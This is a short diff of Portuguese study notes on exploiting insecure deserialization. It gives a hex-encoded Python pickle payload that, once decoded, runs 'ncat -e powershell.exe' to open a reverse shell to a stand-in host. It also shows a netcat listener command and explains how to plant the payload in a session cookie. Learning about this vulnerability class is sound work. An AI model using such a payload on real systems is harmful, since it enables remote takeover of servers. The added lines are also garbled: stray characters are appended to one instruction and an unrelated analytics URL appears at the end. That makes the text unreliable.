@@ -35,10 +35,11 @@ INSECURE DESERIALIZATION
 
     -> vai ser gerado uma versão serializada desse código, que seria: b'8004953E000000000000008C026F73948C0673797374656D9493948C266E636174202D6520706F7765727368656C6C2E657865206861636B65722E6D616E203434343494859452942E'
 
-    -> agora, ir no console e abrir uma porta de preferencia (ex: 4444)
+    -> agora, ir no console e abrir uma porta de preferencia (ex: 4444)%'))
         -> nc -lvp 444
 
     -> então, aproveitando os cookies, que guardam dados serializados, podemos setar os cookies para guardar esse payload:
         -> no console:
         -> document.cookie='session=*stream de bytes gerado*'
 
+events.split.io/api/testImpressions/bulk
